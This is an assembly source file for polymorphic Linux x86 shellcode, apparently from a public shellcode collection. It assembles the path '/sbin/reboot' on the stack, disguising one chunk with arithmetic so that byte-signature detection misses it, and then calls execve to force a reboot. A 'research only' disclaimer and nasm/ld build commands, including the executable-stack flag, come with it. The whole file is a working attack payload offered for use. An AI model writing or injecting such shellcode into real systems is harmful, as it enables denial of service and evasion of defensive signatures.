; Polymorphic  Linux x86 PUSH reboot()
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; 
; $ nasm -f elf32 -o reboot.o reboot.nasm
; $ ld -z execstack -o reboot reboot.o
;
global _start			

section .text
_start:
    xor eax,eax
    push eax
    push dword 0x746f6f62
    mov edi, 0x05020f0e      ; push dword 0x65722f6e
    add edi,0x60702060
    push edi
    push dword 0x6962732f    ; /sbin/reboot
    mov ebx,esp
    push eax
    mov edx,esp
    push ebx
    mov ecx,esp
    push 0xa
    pop eax
    add al, 1                ; mov al,0xb
    int 0x80

